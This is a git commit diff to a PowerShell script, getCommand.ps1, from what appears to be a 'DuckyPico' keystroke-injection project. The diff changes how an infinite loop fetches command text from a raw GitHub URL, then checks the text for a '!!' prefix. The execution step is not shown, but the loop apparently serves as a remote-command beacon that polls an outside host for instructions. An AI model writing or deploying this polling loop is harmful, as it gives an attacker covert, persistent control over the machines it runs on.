9628d1642d26e66c3314b44a96738dc7c785e1c1
JH517 <jordanhyde@live.co.uk>
2025-03-26 09:41:26 +0000

    Update getCommand.ps1

--- getCommand.ps1
+++ getCommand.ps1
@@ -4,11 +4,8 @@ $githubUrl = "https://raw.githubusercontent.com/JH517/DuckyPico/refs/heads/main/
 # Start an infinite loop
 while ($true) {
     try {
-        # Force a new request and clear the cache by using Invoke-WebRequest
-        $response = Invoke-WebRequest -Uri $githubUrl
-
-        # Convert the content to a string explicitly (in case it's byte data)
-        $command = [System.Text.Encoding]::UTF8.GetString($response.Content)
+        # Fetch the raw content of the GitHub page (plain text) for every iteration
+        $command = Invoke-RestMethod -Uri $githubUrl
 
         # Check if the command starts with '!!' and strip that part off
         if ($command -like "!!*") {
